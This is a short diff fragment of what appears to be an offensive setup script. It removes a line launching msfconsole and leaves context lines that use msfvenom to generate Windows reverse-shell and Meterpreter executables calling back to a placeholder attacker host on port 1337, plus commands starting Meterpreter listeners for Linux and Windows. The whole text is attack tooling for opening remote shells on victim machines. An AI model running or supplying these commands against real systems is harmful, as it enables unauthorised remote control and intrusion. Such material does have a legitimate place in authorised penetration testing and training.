@@ -5,4 +5,3 @@ msfvenom -p windows/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > s
 msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > meterpreter.exe
 meterpreter_handler_linux "$ATTACKER_IP" 1337
 meterpreter_handler_windows "$ATTACKER_IP" 1337
-msfconsole
